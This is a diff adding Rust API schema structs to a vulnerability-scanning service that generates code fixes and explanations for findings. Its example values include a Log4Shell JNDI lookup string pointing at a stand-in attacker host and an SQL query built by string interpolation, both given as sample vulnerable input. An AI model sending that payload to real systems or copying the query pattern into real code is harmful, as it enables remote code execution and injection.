@@ -729,3 +729,172 @@ pub struct BatchDependencyAnalysisResponse {
     /// Batch analysis metadata
     pub metadata: BatchAnalysisMetadata,
 }
+
+/// Request for generating a code fix
+#[derive(Deserialize, ToSchema)]
+pub struct GenerateCodeFixRequest {
+    /// The vulnerability ID (e.g., CVE-2021-44228)
+    #[schema(example = "CVE-2021-44228")]
+    pub vulnerability_id: String,
+
+    /// The vulnerable code snippet
+    #[schema(example = "logger.error(\"${jndi:ldap://attacker.com/a}\");")]
+    pub vulnerable_code: String,
+
+    /// The programming language
+    #[schema(example = "java")]
+    pub language: String,
+
+    /// Additional context (e.g., surrounding code, file path)
+    #[schema(example = "src/main/java/com/example/App.java")]
+    pub context: Option<String>,
+}
+
+/// Response for code fix generation
+#[derive(Serialize, ToSchema)]
+pub struct CodeFixResponse {
+    /// The suggested fix code
+    #[schema(example = "logger.error(\"User input: {}\", sanitizedInput);")]
+    pub fixed_code: String,
+
+    /// Explanation of the fix
+    #[schema(
+        example = "Replaced direct string concatenation with parameterized logging to prevent injection."
+    )]
+    pub explanation: String,
+
+    /// Confidence score (0.0 - 1.0)
+    #[schema(example = 0.95)]
+    pub confidence: f32,
+}
+
+/// Request for explaining a vulnerability
+#[derive(Deserialize, ToSchema)]
+pub struct ExplainVulnerabilityRequest {
+    /// The vulnerability ID
+    #[schema(example = "CVE-2021-44228")]
+    pub vulnerability_id: String,
+
+    /// The vulnerability description or summary
+    #[schema(
+        example = "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints."
+    )]
+    pub description: String,
+
+    /// The affected package/component
+    #[schema(example = "org.apache.logging.log4j:log4j-core")]
+    pub affected_component: String,
+
+    /// Target audience level (technical, non-technical, executive)
+    #[schema(example = "technical")]
+    pub audience: Option<String>,
+}
+
+/// Response for vulnerability explanation
+#[derive(Serialize, ToSchema)]
+pub struct ExplanationResponse {
+    /// The explanation text
+    #[schema(example = "This vulnerability allows remote code execution because...")]
+    pub explanation: String,
+
+    /// Key takeaways or summary points
+    #[schema(example = json!(["Remote Code Execution", "JNDI Injection", "Critical Severity"]))]
+    pub key_points: Vec<String>,
+
+    /// Recommended mitigation steps
+    #[schema(example = json!(["Upgrade to version 2.15.0", "Disable JNDI lookup"]))]
+    pub mitigation_steps: Vec<String>,
+}
+
+/// Request for natural language query
+#[derive(Deserialize, ToSchema)]
+pub struct NaturalLanguageQueryRequest {
+    /// The user's query
+    #[schema(example = "How do I fix the SQL injection in login.php?")]
+    pub query: String,
+
+    /// Context (e.g., project ID, file content)
+    #[schema(example = "{\"file\": \"login.php\", \"content\": \"...\"}")]
+    pub context: Option<serde_json::Value>,
+}
+
+/// Response for natural language query
+#[derive(Serialize, ToSchema)]
+pub struct NaturalLanguageQueryResponse {
+    /// The answer to the query
+    #[schema(example = "To fix the SQL injection, you should use prepared statements...")]
+    pub answer: String,
+
+    /// Related resources or links
+    #[schema(example = json!(["https://owasp.org/www-community/attacks/SQL_Injection"]))]
+    pub references: Vec<String>,
+}
+
+/// Request for enriching job findings with LLM insights
+#[derive(Deserialize, ToSchema)]
+pub struct EnrichFindingsRequest {
+    /// Optional list of specific finding IDs to enrich (if empty, prioritizes by severity)
+    #[schema(example = json!(["finding_123", "finding_456"]))]
+    pub finding_ids: Option<Vec<String>>,
+
+    /// Optional code context per finding ID (for more accurate suggestions)
+    #[schema(example = json!({"finding_123": "def login(user, password):\n    query = f\"SELECT * FROM users WHERE user='{user}'\""}), default)]
+    pub code_contexts: Option<std::collections::HashMap<String, String>>,
+}
+
+/// Response for findings enrichment
+#[derive(Serialize, ToSchema)]
+pub struct EnrichFindingsResponse {
+    /// Job ID that was enriched
+    #[schema(example = "550e8400-e29b-41d4-a716-446655440000")]
+    pub job_id: Uuid,
+
+    /// Number of findings successfully enriched
+    #[schema(example = 5)]
+    pub enriched_count: usize,
+
+    /// Number of findings that failed enrichment
+    #[schema(example = 1)]
+    pub failed_count: usize,
+
+    /// Enriched findings with LLM-generated insights
+    pub findings: Vec<EnrichedFindingDto>,
+}
+
+/// DTO for enriched finding
+#[derive(Serialize, ToSchema)]
+pub struct EnrichedFindingDto {
+    /// Finding ID
+    #[schema(example = "finding_123")]
+    pub id: String,
+
+    /// Finding severity
+    #[schema(example = "Critical")]
+    pub severity: String,
+
+    /// Finding description
+    #[schema(example = "SQL Injection vulnerability detected")]
+    pub description: String,
+
+    /// Location (file:line:column)
+    #[schema(example = "src/auth.py:42:10")]
+    pub location: String,
+
+    /// LLM-generated explanation
+    #[schema(example = "This SQL injection vulnerability allows attackers to...")]
+    pub explanation: Option<String>,
+
+    /// LLM-generated remediation suggestion
+    #[schema(example = "Use parameterized queries or an ORM...")]
+    pub remediation_suggestion: Option<String>,
+
+    /// Risk summary
+    #[schema(example = "High risk: potential data breach")]
+    pub risk_summary: Option<String>,
+
+    /// Whether enrichment was successful
+    pub enrichment_successful: bool,
+
+    /// Error message if enrichment failed
+    pub enrichment_error: Option<String>,
+}
